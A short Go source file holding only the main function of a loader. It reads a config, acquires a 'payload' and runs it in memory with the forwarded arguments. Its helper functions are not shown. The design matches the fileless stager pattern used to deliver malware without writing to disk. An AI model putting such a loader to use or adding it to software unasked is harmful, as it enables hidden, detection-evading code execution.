package main

import (
	"flag"
	"fmt"
	"os"
)

func main() {
	configPath := flag.String("c", "", "Path to configuration file")
	flag.Parse()

	if *configPath == "" {
		fmt.Fprintf(os.Stderr, "Usage: %s -c <config_path>\n", os.Args[0])
		os.Exit(1)
	}

	cfg, err := LoadConfig(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Configuration error: %v\n", err)
		os.Exit(1)
	}

	env := LoadEnv()

	payload, err := GetPayload(cfg, env)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Payload acquisition failed: %v\n", err)
		os.Exit(1)
	}

	// Forward original command-line arguments to the launched binary
	args := os.Args[1:]

	exitCode, err := ExecuteInMemory(payload, args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Execution failed: %v\n", err)
		os.Exit(1)
	}

	os.Exit(exitCode)
}

